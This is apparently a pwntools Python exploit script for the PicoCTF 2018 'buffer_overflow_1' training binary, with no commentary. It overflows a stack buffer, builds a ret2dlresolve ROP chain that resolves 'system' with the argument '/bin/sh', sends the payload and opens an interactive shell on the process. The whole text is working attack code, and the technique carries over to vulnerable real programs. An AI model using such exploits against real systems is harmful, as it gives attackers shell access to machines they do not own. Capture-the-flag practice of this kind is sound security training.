from pwn import *
import time

context.arch = 'i386'
elf = ELF('./PicoCTF_2018_buffer_overflow_1')
rop = ROP(elf)

r = process('./PicoCTF_2018_buffer_overflow_1')

dlresolve = Ret2dlresolvePayload(elf, symbol='system', args=['/bin/sh'])
rop.gets(dlresolve.data_addr)
rop.ret2dlresolve(dlresolve)

r.recvline()
r.sendline(b'a' * 0x2C + rop.chain())
time.sleep(1)
r.sendline(dlresolve.payload)
r.recvline()
r.interactive()
